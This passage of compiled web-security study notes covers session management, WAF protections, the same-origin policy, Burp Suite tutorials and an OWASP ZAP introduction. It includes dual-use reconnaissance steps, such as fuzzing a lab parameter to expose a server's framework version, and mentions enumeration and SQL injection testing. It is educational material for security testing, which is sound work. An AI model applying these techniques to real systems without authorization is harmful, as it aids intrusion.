same user are allowed from the same or from different client IP addresses. If the web 
application does not want to allow simultaneous session logons, it must take effective actions 
after each new authentication event, implicitly terminating the previously available session, or 
asking the user (through the old, new or both sessions) about the session that must remain 
active. 
[[ PAGE 18 ]]
It is recommended for web applications to add user capabilities that allow checking the details 
of active sessions at any time, monitor and alert the user about concurrent logons, provide 
user features to remotely terminate sessions manually, and track account activity history 
(logbook) by recording multiple client details such as IP address, User-Agent, login date and 
time, idle time, etc. 
Session Management WAF Protections¶ 
There are situations where the web application source code is not available or cannot be 
modified, or when the changes required to implement the multiple security recommendations 
and best practices detailed above imply a full redesign of the web application architecture, and 
therefore, cannot be easily implemented in the short term. 
In these scenarios, or to complement the web application defenses, and with the goal of 
keeping the web application as secure as possible, it is recommended to use external 
protections such as Web Application Firewalls (WAFs) that can mitigate the session 
management threats already described. 
Web Application Firewalls offer detection and protection capabilities against session based 
attacks. On the one hand, it is trivial for WAFs to enforce the usage of security attributes on 
cookies, such as the Secure and HttpOnly flags, applying basic rewriting rules on the Set-
Cookie header for all the web application responses that set a new cookie. 
On the other hand, more advanced capabilities can be implemented to allow the WAF to keep 
track of sessions, and the corresponding session IDs, and apply all kind of protections against 
session fixation (by renewing the session ID on the client-side when privilege changes are 
detected), enforcing sticky sessions (by verifying the relationship between the session ID and 
other client properties, like the IP address or User-Agent), or managing session expiration (by 
forcing both the client and the web application to finalize the session). 
The open-source ModSecurity WAF, plus the OWASP Core Rule Set, provide capabilities to 
detect and apply security cookie attributes, countermeasures against session fixation attacks, 
and session tracking features to enforce sticky sessions. 
What is session management and why is it important? 
Session management is used to facilitate secure interactions between a user and some service 
or application and applies to a sequence of requests and responses associated with that 
particular user. When a user has an ongoing session with a web application, they are 
submitting requests within their session and often times are providing potentially sensitive 
information. The application may retain this information and/or track the status of the user 
during the session across multiple requests. More importantly, it is critical that the application 
has a means of protecting private data belonging to each unique user, especially within 
authenticated sessions. 
Session tokens serve to identify a user’s session within the HTTP traffic being exchanged 
between the application and all of its users. HTTP traffic on its own is stateless, meaning each 
request is processed independently, even if they are related to the same session. Thus, session 
management is crucial for directing these web interactions and these tokens are vital as 
they’re passed back and forth between the user and the web application. Each request and 
response made will have an associated session token which allows the application to 
remember distinct information about the client using it. Session cookies were designed to help 
[[ PAGE 19 ]]
manage sessions, however there are several properties of the cookie that must be configured 
and implemented correctly to prevent potential compromises. 
It should be noted that cookies are not the only means of carrying out a session, it is also 
possible to include headers that contain session tokens. Moreover, while session tokens can be 
embedded within a URL this should not be implemented as URLs are often logged in various 
places and cached, increasingly the likelihood of disclosure. 
What are the vulnerabilities introduced with lack of session management? 
Enforcing correct session management often boils down to the protection and security of the 
session keys. There is a plethora of vulnerabilities introduced with insecure session cookies, 
which can be leveraged by an attacker to take advantage of an authenticated user session. 
Adversaries can take measures to brute force, predict, and expose session tokens which 
ultimately can lead to session hijacking where the malicious party can then impersonate the 
victim and perform actions from their account. 
Session fixation can also take place if the properties of a session token allows an attacker to 
fixate the token of the user once authenticated, it can then also be used to hijack the session. 
Alternatively, this issue may arise if the application fails to check for consistent user 
information throughout the session, reuses session tokens across all forms of access to the 
service, and sets cookies without proper validity periods. 
Once a user’s session is hijacked, an adversary now has the opportunity to make changes 
permitted to the victim from their account and perform actions that could be dangerous as 
well as administrative tasks such as adding/removing users, assigning privileges, etc. The more 
privileges the victim has within the service, the more severe the attack can be. 
What are the best practices for implementing session management? There are many aspects 
to enforcing proper session management, all best practices should be implemented for 
mitigating potential compromise. 
1. Set Secure/HttpOnly Flags on your CookiesRefrain from sending sensitive traffic and 
tokens over an unencrypted channel (HTTP). This can be enforced by setting the 
Secure flag which ensures that data will only be transported over HTTPS. The HttpOnly 
flag should also be set for session cookies as this will prevent client-side JavaScript 
from accessing it which could result in session hijacking. 
2. Generate New Session CookiesNew session tokens should be generated at every stage 
of a session; as soon as a user visits the application, when they provide correct 
credentials, and when a user logs out of their account. A cookie should also expire if 
the account is inactive for a long period of time and force the user to re-authenticate. 
This also applies for changes in state, meaning the cookie should automatically be 
destroyed when the session changes from anonymous to authenticated or vice versa. 
3. Configure Session Cookies ProperlySession tokens should be long, unpredictable, and 
unique. These properties can help to ensure that an attacker cannot guess or brute 
force the value of the token. The expiration on persistent cookies should be set for no 
longer than 30 minutes, which prevents from session fixation and further hijacking. 
This can be achieved by modifying the Expire and Max-Age attributes. If no value is 
specified for the Expire or Max-Age attributes the cookie does not persist in the user’s 
browser and is removed when the tab or browser is closed, this is commonly used for 
[[ PAGE 20 ]]
session cookies. It is also recommended that the scope of domains that are able to 
access the session cookie is limited and restrictive. This is controlled by the Domain 
and Path attributes. 
https://www.packetlabs.net/posts/session-management/ 
https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html 
Same Origin Policy 
The same-origin policy is a critical security mechanism that restricts how a document or script 
loaded by one origin can interact with a resource from another origin. 
It helps isolate potentially malicious documents, reducing possible attack vectors. For example, 
it prevents a malicious website on the Internet from running JS in a browser to read data from 
a third-party webmail service (which the user is signed into) or a company intranet (which is 
protected from direct access by the attacker by not having a public IP address) and relaying 
that data to the attacker. 
Definition of an origin 
Two URLs have the same origin if the protocol, port (if specified), and host are the same for 
both. You may see this referenced as the "scheme/host/port tuple", or just "tuple". (A "tuple" 
is a set of items that together comprise a whole — a generic form for 
double/triple/quadruple/quintuple/etc.) 
The following table gives examples of origin comparisons with the 
URL http://store.company.com/dir/page.html: 
URL 
Outcome 
Reason 
http://store.company.com/dir2/other.html 
Same origin 
Only the path differs 
http://store.company.com/dir/inner/another.html 
Same origin 
Only the path differs 
https://store.company.com/page.html 
Failure 
Different protocol 
http://store.company.com:81/dir/page.html 
Failure 
Different port (http:// is port 80 by de
http://news.company.com/dir/page.html 
Failure 
Different host 
Inherited origins 
Scripts executed from pages with an about:blank or javascript: URL inherit the origin of the 
document containing that URL, since these types of URLs do not contain information about an 
origin server. 
For example, about:blank is often used as a URL of new, empty popup windows into which the 
parent script writes content (e.g. via the Window.open() mechanism). If this popup also 
contains JavaScript, that script would inherit the same origin as the script that created it. 
data: URLs get a new, empty, security context. 
Exceptions in Internet Explorer 
Internet Explorer has two major exceptions to the same-origin policy: 
[[ PAGE 21 ]]
Trust Zones 
If both domains are in the highly trusted zone (e.g. corporate intranet domains), then the 
same-origin limitations are not applied. 
Port 
IE doesn't include port into same-origin checks. 
Therefore, https://company.com:81/index.html and https://company.com/index.html are 
considered the same origin and no restrictions are applied. 
These exceptions are nonstandard and unsupported in any other browser. 
File origins 
Modern browsers usually treat the origin of files loaded using the file:/// schema as opaque 
origins. What this means is that if a file includes other files from the same folder (say), they are 
not assumed to come from the same origin, and may trigger CORS errors. 
Note that the URL specification states that the origin of files is implementation-dependent, 
and some browsers may treat files in the same directory or subdirectory as same-origin even 
though this has security implications. 
Changing origin 
Warning: The approach described here (using the document.domain setter) is deprecated 
because it undermines the security protections provided by the same origin policy, and 
complicates the origin model in browsers, leading to interoperability problems and security 
bugs. 
A page may change its own origin, with some limitations. A script can set the value 
of document.domain to its current domain or a superdomain of its current domain. If set to a 
superdomain of the current domain, the shorter superdomain is used for same-origin checks. 
For example, assume a script from the document 
at http://store.company.com/dir/other.html executes the following: 
document.domain = "company.com"; 
Copy to Clipboard 
Afterward, the page can pass the same-origin check 
with http://company.com/dir/page.html (assuming http://company.com/dir/page.html sets 
its document.domain to "company.com" to indicate that it wishes to allow that - 
see document.domain for more). 
However, company.com could not set document.domain to othercompany.com, since that is 
not a superdomain of company.com. 
The port number is checked separately by the browser. Any call to document.domain, 
including document.domain = document.domain, causes the port number to be overwritten 
with null. Therefore, one cannot make company.com:8080 talk to company.com by only 
setting document.domain = "company.com" in the first. It has to be set in both so their port 
numbers are both null. 
[[ PAGE 22 ]]
The mechanism has some limitations. For example, it will throw a 
"SecurityError" DOMException if the document-domain Feature-Policy is enabled or the 
document is in a sandboxed <iframe>, and changing the origin in this way does not affect the 
origin checks used by many Web APIs 
(e.g. localStorage, indexedDB, BroadcastChannel, SharedWorker). A more exhaustive list of 
failure cases can be found in Document.domain > Failures. 
Note: When using document.domain to allow a subdomain to access its parent, you need to 
set document.domain to the same value in both the parent domain and the subdomain. This is 
necessary even if doing so is setting the parent domain back to its original value. Failure to do 
this may result in permission errors. 
Cross-origin network access 
The same-origin policy controls interactions between two different origins, such as when you 
use XMLHttpRequest or an <img> element. These interactions are typically placed into three 
categories: 
• 
Cross-origin writes are typically allowed. Examples are links, redirects, and form 
submissions. Some HTTP requests require preflight. 
• 
Cross-origin embedding is typically allowed. (Examples are listed below.) 
• 
Cross-origin reads are typically disallowed, but read access is often leaked by 
embedding. For example, you can read the dimensions of an embedded image, the 
actions of an embedded script, or the availability of an embedded resource. 
Here are some examples of resources which may be embedded cross-origin: 
• 
JavaScript with <script src="…"></script>. Error details for syntax errors are only 
available for same-origin scripts. 
• 
CSS applied with <link rel="stylesheet" href="…">. Due to the relaxed syntax rules of 
CSS, cross-origin CSS requires a correct Content-Type header. Restrictions vary by 
browser: Internet Explorer, Firefox, Chrome , Safari (scroll down to CVE-2010-0051) 
and Opera. 
• 
Images displayed by <img>. 
• 
Media played by <video> and <audio>. 
• 
External resources embedded with <object> and <embed>. 
• 
Fonts applied with @font-face. Some browsers allow cross-origin fonts, others require 
same-origin. 
• 
Anything embedded by <iframe>. Sites can use the X-Frame-Options header to prevent 
cross-origin framing. 
How to allow cross-origin access 
Use CORS to allow cross-origin access. CORS is a part of HTTP that lets servers specify any 
other hosts from which a browser should permit loading of content. 
How to block cross-origin access 
[[ PAGE 23 ]]
• 
To prevent cross-origin writes, check an unguessable token in the request — known as 
a Cross-Site Request Forgery (CSRF) token. You must prevent cross-origin reads of 
pages that require this token. 
• 
To prevent cross-origin reads of a resource, ensure that it is not embeddable. It is 
often necessary to prevent embedding because embedding a resource always leaks 
some information about it. 
• 
To prevent cross-origin embeds, ensure that your resource cannot be interpreted as 
one of the embeddable formats listed above. Browsers may not respect the Content-
Type header. For example, if you point a <script> tag at an HTML document, the 
browser will try to parse the HTML as JavaScript. When your resource is not an entry 
point to your site, you can also use a CSRF token to prevent embedding. 
Cross-origin script API access 
JavaScript APIs like iframe.contentWindow, window.parent, window.open, 
and window.opener allow documents to directly reference each other. When two documents 
do not have the same origin, these references provide very limited access 
to Window and Location objects, as described in the next two sections. 
To communicate between documents from different origins, use window.postMessage. 
Specification: HTML Living Standard § Cross-origin objects. 
Window 
The following cross-origin access to these Window properties is allowed: 
Methods 
window.blur 
window.close 
window.focus 
window.postMessage 
Attributes 
 
window.closed 
Read only. 
window.frames 
Read only. 
window.length 
Read only. 
window.location 
Read/Write. 
window.opener 
Read only. 
window.parent 
Read only. 
window.self 
Read only. 
window.top 
Read only. 
[[ PAGE 24 ]]
Methods 
window.window 
Read only. 
Some browsers allow access to more properties than the above. 
Location 
The following cross-origin access to Location properties is allowed: 
Methods 
location.replace 
Attributes 
 
URLUtils.href 
Write-only. 
Some browsers allow access to more properties than the above. 
Cross-origin data storage access 
Access to data stored in the browser such as Web Storage and IndexedDB are separated by 
origin. Each origin gets its own separate storage, and JavaScript in one origin cannot read from 
or write to the storage belonging to another origin. 
Cookies use a separate definition of origins. A page can set a cookie for its own domain or any 
parent domain, as long as the parent domain is not a public suffix. Firefox and Chrome use 
the Public Suffix List to determine if a domain is a public suffix. Internet Explorer uses its own 
internal method to determine if a domain is a public suffix. The browser will make a cookie 
available to the given domain including any sub-domains, no matter which protocol 
(HTTP/HTTPS) or port is used. When you set a cookie, you can limit its availability using 
the Domain, Path, Secure, and HttpOnly flags. When you read a cookie, you cannot see from 
where it was set. Even if you use only secure https connections, any cookie you see may have 
been set using an insecure connection. 
https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy 
Burp Suite 
https://portswigger.net/burp/documentation/desktop/penetration-testing  
Intercepting a request 
Burp Proxy lets you intercept HTTP requests and responses sent between your browser and 
the target server. This enables you to study how the website behaves when you perform 
different actions. 
Step 1: Launch Burp's embedded browser 
Go to the Proxy > Intercept tab. 
Click the Intercept is off button, so it toggles to Intercept is on. 
[[ PAGE 25 ]]
 
Click Open Browser. This launches Burp's embedded Chromium browser, which is 
preconfigured to work with Burp right out of the box. 
Position the windows so that you can see both Burp and the browser. 
 
Step 2: Intercept a request 
Using the embedded browser, try to visit https://portswigger.net and observe that the site 
doesn't load. Burp Proxy has intercepted the HTTP request that was issued by the browser 
before it could reach the server. You can see this intercepted request on the Proxy > 
Intercept tab. 
 
The request is held here so that you can study it, and even modify it, before forwarding it to 
the target server. 
Step 3: Forward the request 
Click the Forward button several times to send the intercepted request, and any subsequent 
ones, until the page loads in the browser. 
Step 4: Switch off interception 
[[ PAGE 26 ]]
Due to the number of requests browsers typically send, you often won't want to intercept 
every single one of them. Click the Intercept is on button so that it now says Intercept is off. 
 
Go back to the embedded browser and confirm that you can now interact with the site as 
normal. 
Step 5: View the HTTP history 
In Burp, go to the Proxy > HTTP history tab. Here, you can see the history of all HTTP traffic 
that has passed through Burp Proxy, even while interception was switched off. 
Click on any entry in the history to view the raw HTTP request, along with the corresponding 
response from the server. 
 
This lets you explore the website as normal and study the interactions between your browser 
and the server afterwards, which is more convenient in many cases. 
Sending a request to Burp Repeater 
The most common way of using Burp Repeater is to send it a request from another of Burp's 
tools. In this example, we'll send a request from the HTTP history in Burp Proxy. 
Step 1: Launch the embedded browser 
Launch Burp's browser and use it to visit the following URL: 
[[ PAGE 27 ]]
https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-error-
messages 
When the page loads, click Access the lab. If prompted, log in to your portswigger.net account. 
After a few seconds, you will see your own instance of a fake shopping website. 
Step 2: Browse the target site 
In the browser, explore the site by clicking on a couple of the product pages. 
Step 2: Study the HTTP history 
In Burp, go to the Proxy > HTTP history tab. To make this easier to read, keep clicking the 
header of the leftmost column (#) until the requests are sorted in descending order. This way, 
you can see the most recent requests at the top. 
 
Step 3: Identify an interesting request 
Notice that each time you access a product page, the browser sends a GET /product request 
with a productId query parameter. 
 
[[ PAGE 28 ]]
Let's use Burp Repeater to look at this behavior more closely. 
Step 4: Send the request to Burp Repeater 
Right-click on any of the GET /product?productId=[...] requests and select Send to Repeater. 
 
Go to the Repeater tab to see that your request is waiting for you in its own numbered tab. 
Step 5: Issue the request and view the response 
Click Send to issue the request and see the response from the server. You can resend this 
request as many times as you like and the response will be updated each time. 
 
 
Testing different input with Burp Repeater 
[[ PAGE 29 ]]
By resending the same request with different input each time, you can identify and confirm a 
variety of input-based vulnerabilities. This is one of the most common tasks you will perform 
during manual testing with Burp Suite. 
Step 1: Reissue the request with different input 
Change the number in the productId parameter and resend the request. Try this with a few 
arbitrary numbers, including a couple of larger ones. 
 
Step 2: View the request history 
Use the arrows to step back and forth through the history of requests that you've sent, along 
with their matching responses. The drop-down menu next to each arrow also lets you jump to 
a specific request in the history. 
 
[[ PAGE 30 ]]
This is useful for returning to previous requests that you've sent in order to investigate a 
particular input further. 
Compare the content of the responses, notice that you can successfully request different 
product pages by entering their ID, but receive a Not Found response if the server was unable 
to find a product with the given ID. Now we know how this page is supposed to work, we can 
use Burp Repeater to see how it responds to unexpected input. 
Step 3: Try sending unexpected input 
The server seemingly expects to receive an integer value via this productId parameter. Let's 
see what happens if we send a different data type. 
Send another request where the productId is a string of characters. 
 
Step 4: Study the response 
Observe that sending a non-integer productId has caused an exception. The server has sent a 
verbose error response containing a stack trace. 
 
Notice that the response tells you that the website is using the Apache Struts framework - it 
even reveals which version. 
[[ PAGE 31 ]]
 
In a real scenario, this kind of information could be useful to an attacker, especially if the 
named version is known to contain additional vulnerabilities. 
Go back to the lab in your browser and click the Submit solution button. Enter the Apache 
Struts version number that you discovered in the response (2 2.3.31). 
 
Congratulations, that's another lab under your belt! You've used Burp Repeater to audit part of 
a website and successfully discovered an information disclosure vulnerability. 
Burp Comparer 
Burp Comparer is a simple tool for performing a comparison (a visual "diff") between any two 
items of data. Some common uses for Burp Comparer are as follows: 
• 
When looking for username enumeration conditions, you can compare responses to 
failed logins using valid and invalid usernames, looking for subtle differences in the 
responses. 
• 
When an Intruder attack has resulted in some very large responses with different 
lengths than the base response, you can compare these to quickly see where the 
differences lie. 
• 
When comparing the site maps or Proxy history entries generated by different types of 
users, you can compare pairs of similar requests to see where the differences lie that 
give rise to different application behavior. 
[[ PAGE 32 ]]
• 
When testing for blind SQL injection bugs using Boolean condition injection and other 
similar tests, you can compare two responses to see whether injecting different 
conditions has resulted in a relevant difference in responses. 
Loading data into Comparer 
You can load data into Comparer in the following ways: 
• 
Paste it directly form the clipboard. 
• 
Load it from file. 
• 
Select data anywhere within Burp, and choose Send to Comparer from the context 
menu. 
Performing comparisons 
Each item of loaded data is shown in two identical lists. To perform a comparison, select a 
different item from each list and click one of the Compare buttons: 
• 
Word compare - This comparison tokenizes each item of data based on whitespace 
delimiters, and identifies the token-level edits required to transform the first item into 
the second. It is most useful when the interesting differences between the compared 
items exist at the word level, for example in HTML documents containing different 
content. 
• 
Byte compare - This comparison identifies the byte-level edits required to transform 
the first item into the second. It is most useful when the interesting differences 
between the compared items exist at the byte level, for example in HTTP requests 
containing subtly different values in a particular parameter or cookie value. 
Note 
The byte-level comparison is considerably more computationally intensive, and you should 
normally only employ this option when a word-level comparison has failed to identify the 
relevant differences in an informative way. 
When you initiate a comparison, a new window appears showing the results of the 
comparison. The title bar of the window indicates the total number of differences (i.e. edits) 
between the two items. The two main panels show the compared items colorized to indicate 
each modification, deletion and addition required to transform the first item into the second. 
You can view each item in text or hex form. Selecting the Sync views option will enable you to 
scroll the two panels simultaneously and so quickly identify the interesting edits in most 
situations. 
Burp Decoder 
Burp Decoder is a simple tool for transforming encoded data into its canonical form, or for 
transforming raw data into various encoded and hashed forms. It is capable of intelligently 
recognizing several encoding formats using heuristic techniques. 
Loading data into Decoder 
You can load data into Decoder in two ways: 
[[ PAGE 33 ]]
• 
Type or paste it directly into the top editor panel. 
• 
Select data anywhere within Burp, and choose Send to Decoder from the context 
menu. 
You can use the Text and Hex buttons to toggle the type of editor to use on your data. 
Transformations 
Different transformations can be applied to different parts of the data. The following decode 
and encode operations are available: 
• 
URL 
• 
HTML 
• 
Base64 
• 
ASCII hex 
• 
Hex 
• 
Octal 
• 
Binary 
• 
GZIP 
Additionally, various common hash functions are available, dependent upon the capabilities of 
your Java platform. 
When a part of the data has a transformation applied, the following things happen: 
• 
The part of the data to be transformed is colorized accordingly. (View the manual 
drop-down lists to see the colors used.) 
• 
A new editor is opened showing the results of all the applied transformations. Any 
parts of the data that have not been transformed are copied into the new panel in 
their raw form. 
The new editor enables you to work recursively, applying multiple layers of transformations to 
the same data, to unpack or apply complex encoding schemes. Further, you can edit the 
transformed data in any of the editor panels, not only the top panel. So, for example, you can 
take a complex data structure, perform URL and HTML decoding on it, edit the decoded data, 
and then reapply the HTML and URL encoding (in reverse order), to generate modified but 
validly formatted data to use in an attack. 
Working manually 
To perform manual decoding and encoding, use the drop-down lists to select the required 
transformation. The chosen transformation will be applied to the selected data, or to the 
whole data if nothing is selected. 
Smart decoding 
On any panel within Decoder, you can click the Smart Decode button. Burp will then attempt 
to intelligently decode the contents of that panel by looking for data that appears to be 
[[ PAGE 34 ]]
encoded in recognizable formats such as URL-encoding or HTML-encoding. This action is 
performed recursively, continuing until no further recognizable data formats are detected. This 
option can be a useful first step when you have identified some opaque data, and want to take 
a quick look to see if it can be easily decoded into a more recognizable form. The decoding that 
is applied to each part of the data is indicated using the usual colorization. 
Because Burp Decoder makes a "best guess" attempt to recognize some common encoding 
formats, it will sometimes make mistakes. When this occurs, you can easily see all of the stages 
involved in the decoding, and the transformation that was applied at each position. You can 
then manually fix any incorrect transformations using the manual controls, and continue the 
decoding manually or smartly from this point. 
Burpsuite Decoder can be said as a tool which is used for transforming encoded data into its 
real form, or for transforming raw data into various encoded and hashed forms. This tool is 
capable of recognizing several encoding formats using defined techniques. Encoding is the 
process of putting a sequence of character’s (letters, numbers, punctuation, and symbols) into 
a specialized format which is used for efficient transmission or storage. Decoding is the 
opposite process of encoding the conversion of an encoded format back into the original 
format. Encoding and decoding can be used in data communications, networking, and storage. 
Today we are discussing the Decoder Option of ‘Burp Suite’. Burp Suite is a tool which is used 
for testing Web application security. Its various tools work seamlessly together to support the 
entire testing process, from initial mapping and analysis of an application’s attack surface, 
through to finding and exploiting security vulnerabilities. This tool is written in JAVA and is 
developed by PortSwigger Security. 
There are 9 types of decoder format in Burp Suite: 
• 
Plain text 
• 
URL 
• 
HTML 
• 
Base64 
• 
ASCII Hex 
• 
Hex 
• 
Octal 
• 
Binary 
• 
Gzip 
URL Encoder & Decoder 
When you will explore decoder option in burp suite you will observe two sections left and 
right. The left section is further divided into two and three sections for encoding and decode 
option respectively. The right section contains the function tab for encoding and decodes 
option. And if you will observe given below image you can notice there are two radio buttons 
for selecting the type of content you want to encode or decode. 
[[ PAGE 35 ]]
Enable the radio button for text option and then we can give any input in the box to be 
encoded, here we have given Raj chandel as an input as shown in the image. After that click on 
the Encoded as an option and select URL field from given list as shown in the image. We will 
get the encoded result in URL format in the second box as shown in the image. 
 
 We can directly decode the Encoded URL Text by clicking on the Decoded as an option and 
selecting the URL field from the given list of options as shown in the image.  This 
will decode the encoded URL text into plain text in the third box as shown in the image. 
 
HTML Encoder & Decoder 
[[ PAGE 36 ]]
Repeat the same and give any input in the first box to be encoded, here we have given Raj 
chandel as an input as shown in the image. After that click on the Encoded as an option and 
select HTML field as shown in the image. We will get the encoded result in HTML format in 
the second box as shown in the image. 
 
We can directly decode the Encoded HTML Text by clicking on the Decoded as an option and 
selecting the HTML field as shown in the image.  This will decode the encoded HTML 
text into plain text in the third box as shown in the image. 
 
Base64 Encoder & Decoder 
Repeat the same process and give any input in the first box to be encoded, here we have 
given Raj chandel as an input as shown in the image. After that click on the Encoded as an 
[[ PAGE 37 ]]
option and select Base64 field as shown in the image. We will get the encoded 
result in Base64 format in the second box as shown in the image. 
 
We can directly decode the Encoded Base64 Text by clicking on the Decoded as an option and 
selecting the Base64 field as shown in the image.  This will decode the encoded Base64 
text into plain text in the third box as shown in the image. 
 
ASCII Hex Encoder & Decoder 
Again repeat the same process and give any input in the first box to be encoded, here we have 
given Raj chandel as an input as shown in the image. After that click on the Encoded as an 
option and select ASCII Hex field as shown in the image. We will get the encoded 
result in ASCII Hex format in the second box as shown in the image. 
[[ PAGE 38 ]]
 
We can directly decode the Encoded ASCII Hex Text by clicking on the Decoded as the option 
and selecting ASCII Hex field as shown in the image.  This will decode the encoded ASCII Hex 
text into plain text in the third box as shown in the image. 
 
Hex Encoder & Decoder 
Repeat same as above and give any input in the first box to be encoded, here we have 
given Raj chandel 123456789 as an input as shown in the image. After that click on 
the Encoded as the option and select Hex option as shown in the image. We will get 
the encoded result in Hex format in the second box as shown in the image. 
[[ PAGE 39 ]]
 
We can directly decode the Encoded Hex Text by clicking on the Decoded as the option and 
selecting the Hex field as shown in the image. This will decode the encoded Hex text into plain 
text in the third box as shown in the image. 
 
Octal Encoder & Decoder 
Repeat again and give any input in the first box to be encoded, here we have given Raj 
chandel 123456789 as an input as shown in the image. After that click on the Encoded as an 
option and select Octal field as shown in the image. We will get the encoded result in Octal 
format in the second box as shown in the image. 
[[ PAGE 40 ]]
 
We can directly decode the Encoded Octal Text by clicking on the Decoded as the option and 
selecting the Octal field as shown in the image.  This will decode the encoded Octal 
text into plain text in the third box as shown in the image. 
 
Binary Encoder & Decoder 
Repeat the same and give any input in the first box to be encoded, here we have given Raj 
chandel 123456789 as an input as shown in the image. After that click on the Encoded as an 
option and select Binary field as shown in the image. We will get the encoded result in Binary 
format in the second box as shown in the image. 
[[ PAGE 41 ]]
 
We can directly decode the Encoded Binary Text by clicking on the Decoded as an option and 
selecting the Binary field as shown in the image.  This will decode the encoded Binary 
text into plain text in the third box as shown in the image. 
 
Gzip Encoder & Decoder 
Give any input in the first box to be encoded, here we have given Raj chandel as an input as 
shown in the image. After that click on the Encoded as an option and select Gzip field as 
shown in the image. We will get the encoded result in Gzip format in the second box as shown 
in the image. 
[[ PAGE 42 ]]
 
We can directly decode the Encoded Gzip Text by clicking on the Decoded as an option and 
selecting the Gzip field as shown in the image.  This will decode the encoded Gzip 
text into plain text in the third box as shown in the image. 
 
Credits: https://www.hackingarticles.in/burpsuite-encoder-decoder-tutorial/  
OWASP Zap 
Overview  
This guide is intended to serve as a basic introduction for using ZAP to perform security testing, 
even if you don’t have a background in security testing. To that end, some security testing 
concepts and terminology is included but this document is not intended to be a 
comprehensive guide to either ZAP or security testing. 
[[ PAGE 43 ]]
It is also available as a pdf to make it easier to print. 
Security Testing Basics  
Software security testing is the process of assessing and testing a system to discover security 
risks and vulnerabilities of the system and its data. There is no universal terminology but for 
our purposes, we define assessments as the analysis and discovery of vulnerabilities without 
attempting to actually exploit those vulnerabilities. We define testing as the discovery and 
attempted exploitation of vulnerabilities. 
Security testing is often broken out, somewhat arbitrarily, according to either the type of 
vulnerability being tested or the type of testing being done. A common breakout is: 
• 
Vulnerability Assessment – The system is scanned and analyzed for security issues. 
• 
Penetration Testing – The system undergoes analysis and attack from simulated 
malicious attackers. 
• 
Runtime Testing – The system undergoes analysis and security testing from an end-
user. 
• 
Code Review – The system code undergoes a detailed review and analysis looking 
specifically for security vulnerabilities. 
Note that risk assessment, which is commonly listed as part of security testing, is not included 
in this list. That is because a risk assessment is not actually a test but rather the analysis of the 
perceived severity of different risks (software security, personnel security, hardware security, 
etc.) and any mitigation steps for those risks. 
More About Penetration Testing  
Penetration Testing (pentesting) is carried out as if the tester was a malicious external attacker 
with a goal of breaking into the system and either stealing data or carrying out some sort of 
denial-of-service attack. 
Pentesting has the advantage of being more accurate because it has fewer false positives 
(results that report a vulnerability that isn’t actually present), but can be time-consuming to 
run. 
Pentesting is also used to test defence mechanisms, verify response plans, and confirm 
security policy adherence. 
Automated pentesting is an important part of continuous integration validation. It helps to 
uncover new vulnerabilities as well as regressions for previous vulnerabilities in an 
environment which quickly changes, and for which the development may be highly 
collaborative and distributed. 
The Pentesting Process  
Both manual and automated pentesting are used, often in conjunction, to test everything from 
servers, to networks, to devices, to endpoints. This document focuses on web application or 
web site pentesting. 
Pentesting usually follows these stages: 
[[ PAGE 44 ]]
• 
Explore – The tester attempts to learn about the system being tested. This includes 
trying to determine what software is in use, what endpoints exist, what patches are 
installed, etc. It also includes searching the site for hidden content, known 
vulnerabilities, and other indications of weakness. 
• 
Attack – The tester attempts to exploit the known or suspected vulnerabilities to 
prove they exist. 
• 
Report – The tester reports back the results of their testing, including the 
vulnerabilities, how they exploited them and how difficult the exploits were, and the 
severity of the exploitation. 
Pentesting Goals 
The ultimate goal of pentesting is to search for vulnerabilities so that these vulnerabilities can 
be addressed. It can also verify that a system is not vulnerable to a known class or specific 
defect; or, in the case of vulnerabilities that have been reported as fixed, verify that the system 
is no longer vulnerable to that defect. 
Introducing ZAP  
Zed Attack Proxy (ZAP) is a free, open-source penetration testing tool being maintained under 
the umbrella of the Open Web Application Security Project (OWASP). ZAP is designed 
specifically for testing web applications and is both flexible and extensible. 
At its core, ZAP is what is known as a “man-in-the-middle proxy.” It stands between the 
tester’s browser and the web application so that it can intercept and inspect messages sent 
between browser and web application, modify the contents if needed, and then forward those 
packets on to the destination. It can be used as a stand-alone application, and as a daemon 
process. 
 
If there is another network proxy already in use, as in many corporate environments, ZAP can 
be configured to connect to that proxy. 
 
ZAP provides functionality for a range of skill levels – from developers, to testers new to 
security testing, to security testing specialists. ZAP has versions for each major OS and Docker, 
so you are not tied to a single OS. Additional functionality is freely available from a variety of 
add-ons in the ZAP Marketplace, accessible from within the ZAP client. 
Because ZAP is open-source, the source code can be examined to see exactly how the 
functionality is implemented. Anyone can volunteer to work on ZAP, fix bugs, add features, 
[[ PAGE 45 ]]
create pull requests to pull fixes into the project, and author add-ons to support specialized 
situations. 
As with most open source projects, donations are welcome to help with costs for the projects. 
You can find a donate button on the owasp.org page for ZAP at https://owasp.org/www-
project-zap/. 
Install and Configure ZAP  
ZAP has installers for Windows, Linux, and Mac OS/X. There are also Docker images available 
on the download site listed below. 
Install ZAP 
The first thing to do is install ZAP on the system you intend to perform pentesting on. 
Download the appropriate installer from the Download page. 
Note that ZAP requires Java 8+ in order to run. The Mac OS/X installer includes an appropriate 
version of Java but you must install Java 8+ separately for Windows, Linux, and Cross-Platform 
versions. The Docker versions do not require you to install Java. 
Once the installation is complete, launch ZAP and read the license terms. Click Agree if you 
accept the terms, and ZAP will finish installing, then ZAP will automatically start. 
Persisting a Session 
When you first start ZAP, you will be asked if you want to persist the ZAP session. By default, 
ZAP sessions are always recorded to disk in a HSQLDB database with a default name and 
location. If you do not persist the session, those files are deleted when you exit ZAP. 
If you choose to persist a session, the session information will be saved in the local database so 
you can access it later, and you will be able to provide custom names and locations for saving 
the files. 
 
For now, select No, I do not want to persist this session at this moment in time, then 
click Start. The ZAP sessions will not be persisted for now. 
ZAP Desktop UI  
The ZAP Desktop UI is composed of the following elements: 
1. Menu Bar – Provides access to many of the automated and manual tools. 
[[ PAGE 46 ]]
2. Toolbar – Includes buttons which provide easy access to most commonly used 
features. 
3. Tree Window – Displays the Sites tree and the Scripts tree. 
4. Workspace Window – Displays requests, responses, and scripts and allows you to edit 
them. 
5. Information Window – Displays details of the automated and manual tools. 
6. Footer – Displays a summary of the alerts found and the status of the main automated 
tools. 
 
While using ZAP, you can click Help on the Menu Bar or press F1 to access context-sensitive 
help from the ZAP Desktop User Guide. It is also available online. 
For more information about the UI, see ZAP UI Overview in the ZAP online documentation. 
ZAP also supports a powerful API and command line functionality, both of which are beyond 
the scope of this guide. 
IMPORTANT: You should only use ZAP to attack an application you have permission to test 
with an active attack. Because this is a simulation that acts like a real attack, actual damage 
